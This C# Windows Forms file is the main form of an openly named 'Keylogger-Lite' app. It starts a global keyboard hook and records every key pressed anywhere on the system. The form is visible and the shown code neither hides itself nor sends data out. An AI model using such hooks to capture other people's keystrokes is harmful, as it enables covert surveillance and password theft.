using System;
using System.Drawing;
using System.Windows.Forms;

namespace KeyloggerLite
{
    public class MainForm : Form
    {
        private readonly UIManager uiManager;
        private readonly KeyLogger keyLogger;
        private readonly GlobalKeyboardHook globalHook;
        public MainForm()
        {
            keyLogger = new KeyLogger();
            uiManager = new UIManager(this, keyLogger);
            globalHook = new GlobalKeyboardHook();
            globalHook.KeyPressed += OnGlobalKeyPressed;
            globalHook.Start();
        }

        public KeyLogger KeyLogger => keyLogger;
        public UIManager UIManager => uiManager;

        private void InitializeComponent()
        {
            Text = "Keylogger-Lite";
            Size = new Size(480, 550);
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            BackColor = ColorTranslator.FromHtml("#CCCCCC");

            MouseDown += Form_MouseDown;
        }

        private void Form_MouseDown(object? sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Capture = false;
                Message msg = Message.Create(Handle, 0xA1, new IntPtr(2), IntPtr.Zero);
                WndProc(ref msg);
            }
        }
        private void OnGlobalKeyPressed(Keys key)
        {
            if (!keyLogger.IsRunning) return;

             // Модифікатори, службові клавіші (Enter, Shift тощо)
            if (key < Keys.Space || key > Keys.Z || Control.ModifierKeys != Keys.None)
                keyLogger.HandleKeyPress($"[{key}]");
            else
                keyLogger.HandleKeyPress(key.ToString());
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            globalHook.Stop();
            base.OnFormClosing(e);
        }
    }
}